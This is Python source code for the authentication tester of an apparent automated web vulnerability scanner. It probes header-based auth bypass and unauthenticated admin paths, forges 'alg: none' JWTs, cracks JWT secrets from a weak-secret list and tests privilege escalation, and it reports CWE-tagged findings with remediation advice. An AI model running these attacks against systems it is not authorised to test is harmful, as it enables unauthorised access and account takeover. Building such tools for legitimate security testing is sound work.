"""
BREACH.AI - Authentication & Authorization Tester
==================================================
Tests for auth bypass, JWT attacks, privilege escalation.
"""

import asyncio
import re
import json
import base64
import time
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple
from urllib.parse import urljoin
import aiohttp

from ..payloads import AUTH_BYPASS_HEADERS, AUTH_BYPASS_PATHS, JWT_WEAK_SECRETS
from ..spider import DiscoveredEndpoint
from .injections import Finding


class AuthTester:
    """
    Tests authentication and authorization vulnerabilities.

    Tests:
    - Authentication bypass via headers
    - Authentication bypass via path manipulation
    - JWT attacks (none algorithm, weak secrets)
    - Privilege escalation
    - Missing authentication
    """

    def __init__(
        self,
        session: aiohttp.ClientSession,
        base_url: str,
        timeout: int = 10,
        concurrent: int = 15,
    ):
        self.session = session
        self.base_url = base_url
        self.timeout = timeout
        self.concurrent = concurrent
        self._semaphore = asyncio.Semaphore(concurrent)
        self.findings: List[Finding] = []

    async def test_all(
        self,
        endpoints: List[DiscoveredEndpoint],
        cookies: Dict = None,
    ) -> List[Finding]:
        """Run all authentication tests."""
        print(f"\n[AUTH] Testing authentication and authorization...")

        # Phase 1: Test auth bypass on protected endpoints
        protected = [ep for ep in endpoints if ep.requires_auth]
        print(f"[AUTH] Testing {len(protected)} protected endpoints for auth bypass...")

        for ep in protected[:50]:  # Limit
            await self._test_auth_bypass(ep, cookies)

        # Phase 2: Test JWT attacks if cookies contain JWTs
        if cookies:
            jwt_cookies = self._find_jwt_cookies(cookies)
            if jwt_cookies:
                print(f"[AUTH] Testing {len(jwt_cookies)} JWT tokens...")
                for name, token in jwt_cookies:
                    await self._test_jwt_attacks(name, token, cookies)

        # Phase 3: Test for missing auth on sensitive endpoints
        print(f"[AUTH] Testing for missing authentication on admin paths...")
        await self._test_admin_paths(cookies)

        # Phase 4: Test privilege escalation
        print(f"[AUTH] Testing privilege escalation...")
        await self._test_privilege_escalation(endpoints, cookies)

        print(f"\n[AUTH] Found {len(self.findings)} authentication vulnerabilities")
        return self.findings

    async def _test_auth_bypass(
        self,
        endpoint: DiscoveredEndpoint,
        cookies: Dict = None,
    ) -> Optional[Finding]:
        """Test auth bypass via headers and path manipulation."""

        # Test header bypass
        for header_name, header_value in AUTH_BYPASS_HEADERS[:10]:
            try:
                async with self._semaphore:
                    headers = {header_name: header_value}

                    async with self.session.get(
                        endpoint.url,
                        headers=headers,
                        ssl=False,
                        timeout=self.timeout
                    ) as response:
                        if response.status == 200:
                            body = await response.text()
                            if len(body) > 100 and 'login' not in body.lower():
                                finding = Finding(
                                    severity="CRITICAL",
                                    category="auth_bypass",
                                    title=f"Authentication Bypass via {header_name}",
                                    description=f"Protected endpoint accessible by adding {header_name}: {header_value}",
                                    endpoint=endpoint.url,
                                    method="GET",
                                    parameter=header_name,
                                    payload=header_value,
                                    raw_response=body[:1500],
                                    evidence=f"Header {header_name}: {header_value} bypassed authentication",
                                    business_impact=75000,
                                    impact_explanation="Can bypass authentication and access protected resources as any user.",
                                    curl_command=f"curl -H '{header_name}: {header_value}' '{endpoint.url}'",
                                    steps=[
                                        f"1. Access {endpoint.url} (returns 401/403)",
                                        f"2. Add header: {header_name}: {header_value}",
                                        "3. Endpoint returns 200 with protected content",
                                    ],
                                    remediation="Don't trust proxy headers. Validate authentication server-side. Use proper auth middleware.",
                                    cwe_id="CWE-287",
                                    owasp="A07:2021 – Identification and Authentication Failures",
                                )
                                self.findings.append(finding)
                                return finding

            except:
                pass

        return None

    async def _test_admin_paths(self, cookies: Dict = None):
        """Test for accessible admin paths without authentication."""

        for path in AUTH_BYPASS_PATHS[:30]:
            url = urljoin(self.base_url, path)

            try:
                async with self._semaphore:
                    # Test without any auth
                    async with self.session.get(
                        url,
                        ssl=False,
                        timeout=self.timeout
                    ) as response:
                        if response.status == 200:
                            body = await response.text()

                            # Check if it's actual admin content
                            admin_indicators = ['admin', 'dashboard', 'management', 'settings',
                                                'users', 'configuration', 'control panel']

                            if len(body) > 200 and any(ind in body.lower() for ind in admin_indicators):
                                # Skip if it's a login page
                                if 'login' not in body.lower()[:500] and 'password' not in body.lower()[:500]:
                                    finding = Finding(
                                        severity="CRITICAL",
                                        category="missing_auth",
                                        title=f"Admin Panel Accessible Without Auth - {path}",
                                        description=f"Administrative interface accessible without authentication.",
                                        endpoint=url,
                                        method="GET",
                                        parameter="",
                                        payload=path,
                                        raw_response=body[:1500],
                                        evidence="Admin interface accessible without login",
                                        business_impact=100000,
                                        impact_explanation="Full administrative access. Can modify users, settings, data.",
                                        curl_command=f"curl '{url}'",
                                        steps=[
                                            f"1. Navigate to {url}",
                                            "2. Observe admin interface without authentication",
                                            "3. Access all administrative functions",
                                        ],
                                        remediation="Implement authentication on all admin routes. Use role-based access control.",
                                        cwe_id="CWE-306",
                                        owasp="A07:2021 – Identification and Authentication Failures",
                                    )
                                    self.findings.append(finding)

            except:
                pass

    def _find_jwt_cookies(self, cookies: Dict) -> List[Tuple[str, str]]:
        """Find JWT tokens in cookies."""
        jwt_pattern = re.compile(r'^eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+$')
        jwts = []

        for name, value in cookies.items():
            if jwt_pattern.match(str(value)):
                jwts.append((name, value))

        return jwts

    async def _test_jwt_attacks(
        self,
        cookie_name: str,
        token: str,
        cookies: Dict,
    ):
        """Test JWT for vulnerabilities."""

        try:
            # Decode JWT
            parts = token.split('.')
            if len(parts) != 3:
                return

            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))

            original_alg = header.get('alg', 'unknown')

            # Test 1: None algorithm
            await self._test_jwt_none_alg(cookie_name, header, payload, cookies)

            # Test 2: Algorithm confusion (RS256 to HS256)
            if original_alg.startswith('RS'):
                await self._test_jwt_alg_confusion(cookie_name, header, payload, cookies)

            # Test 3: Weak secret
            if original_alg.startswith('HS'):
                await self._test_jwt_weak_secret(cookie_name, token, cookies)

        except Exception as e:
            pass

    async def _test_jwt_none_alg(
        self,
        cookie_name: str,
        header: Dict,
        payload: Dict,
        cookies: Dict,
    ):
        """Test JWT none algorithm attack."""

        # Create token with alg: none
        header_none = header.copy()
        header_none['alg'] = 'none'

        new_header = base64.urlsafe_b64encode(json.dumps(header_none).encode()).decode().rstrip('=')
        new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        none_token = f"{new_header}.{new_payload}."

        # Test the token
        test_cookies = cookies.copy()
        test_cookies[cookie_name] = none_token

        # Try to access protected endpoint
        for ep in ['/api/user', '/api/me', '/api/profile', '/user', '/me', '/profile']:
            url = urljoin(self.base_url, ep)

            try:
                async with self._semaphore:
                    async with self.session.get(
                        url,
                        cookies=test_cookies,
                        ssl=False,
                        timeout=self.timeout
                    ) as response:
                        if response.status == 200:
                            body = await response.text()
                            if len(body) > 50 and 'error' not in body.lower():
                                finding = Finding(
                                    severity="CRITICAL",
                                    category="jwt_none",
                                    title="JWT None Algorithm Attack",
                                    description="Server accepts JWT with algorithm 'none', allowing signature bypass.",
                                    endpoint=url,
                                    method="GET",
                                    parameter=cookie_name,
                                    payload=none_token[:100] + "...",
                                    raw_response=body[:1000],
                                    evidence="JWT with alg:none accepted by server",
                                    business_impact=150000,
                                    impact_explanation="Can forge JWT for any user. Complete authentication bypass.",
                                    curl_command=f"curl -b '{cookie_name}={none_token}' '{url}'",
                                    steps=[
                                        "1. Decode existing JWT",
                                        "2. Change header algorithm to 'none'",
                                        "3. Remove signature (empty string after second dot)",
                                        "4. Modify payload (e.g., change user ID)",
                                        "5. Server accepts forged token",
                                    ],
                                    remediation="Explicitly verify the algorithm. Never accept 'none'. Use a whitelist of allowed algorithms.",
                                    cwe_id="CWE-327",
                                    owasp="A02:2021 – Cryptographic Failures",
                                )
                                self.findings.append(finding)
                                return

            except:
                pass

    async def _test_jwt_alg_confusion(
        self,
        cookie_name: str,
        header: Dict,
        payload: Dict,
        cookies: Dict,
    ):
        """Test JWT algorithm confusion (RS256 -> HS256)."""
        # This attack requires knowing the public key, which we typically don't have
        # Just note potential vulnerability
        pass

    async def _test_jwt_weak_secret(
        self,
        cookie_name: str,
        token: str,
        cookies: Dict,
    ):
        """Test for weak JWT secrets."""

        # We can't actually test this without trying each secret
        # But we can check if common weak secrets work

        import hashlib
        import hmac

        parts = token.split('.')
        header_payload = f"{parts[0]}.{parts[1]}"

        for secret in JWT_WEAK_SECRETS[:20]:
            try:
                # Compute HMAC-SHA256
                computed = hmac.new(
                    secret.encode(),
                    header_payload.encode(),
                    hashlib.sha256
                ).digest()

                computed_b64 = base64.urlsafe_b64encode(computed).decode().rstrip('=')

                if computed_b64 == parts[2]:
                    finding = Finding(
                        severity="CRITICAL",
                        category="jwt_weak_secret",
                        title="JWT Signed with Weak Secret",
                        description=f"JWT secret cracked: '{secret}'. Can forge tokens for any user.",
                        endpoint=self.base_url,
                        method="GET",
                        parameter=cookie_name,
                        payload=f"Secret: {secret}",
                        evidence=f"JWT secret discovered: {secret}",
                        business_impact=150000,
                        impact_explanation="Can forge JWT tokens for any user. Complete authentication bypass.",
                        curl_command=f"# Use jwt_tool or jwt.io to forge tokens with secret: {secret}",
                        steps=[
                            f"1. JWT secret cracked: {secret}",
                            "2. Use jwt.io or jwt_tool to create new tokens",
                            "3. Modify payload to impersonate any user",
                            "4. Access system as admin or any user",
                        ],
                        remediation="Use strong, random secrets (min 256 bits). Use asymmetric algorithms (RS256). Rotate secrets.",
                        cwe_id="CWE-521",
                        owasp="A02:2021 – Cryptographic Failures",
                    )
                    self.findings.append(finding)
                    return

            except:
                pass

    async def _test_privilege_escalation(
        self,
        endpoints: List[DiscoveredEndpoint],
        cookies: Dict = None,
    ):
        """Test for privilege escalation vulnerabilities."""

        # Look for admin/privileged endpoints
        admin_keywords = ['admin', 'superuser', 'root', 'moderator', 'manager',
                          'delete', 'create', 'update', 'modify', 'settings']

        for ep in endpoints:
            if any(kw in ep.url.lower() for kw in admin_keywords):
                # Test if regular user can access
                if cookies:
                    try:
                        async with self._semaphore:
                            async with self.session.get(
                                ep.url,
                                cookies=cookies,
                                ssl=False,
                                timeout=self.timeout
                            ) as response:
                                if response.status == 200:
                                    body = await response.text()

                                    # Check if we got actual admin content
                                    if len(body) > 100 and 'unauthorized' not in body.lower():
                                        finding = Finding(
                                            severity="HIGH",
                                            category="privilege_escalation",
                                            title=f"Privilege Escalation - {ep.url}",
                                            description="Regular user can access administrative functionality.",
                                            endpoint=ep.url,
                                            method="GET",
                                            parameter="",
                                            payload="",
                                            raw_response=body[:1000],
                                            evidence="Admin endpoint accessible with regular user credentials",
                                            business_impact=60000,
                                            impact_explanation="Regular users can perform admin actions.",
                                            curl_command=f"curl -b 'session=...' '{ep.url}'",
                                            remediation="Implement role-based access control. Check permissions on every request.",
                                            cwe_id="CWE-269",
                                            owasp="A01:2021 – Broken Access Control",
                                        )
                                        self.findings.append(finding)

                    except:
                        pass
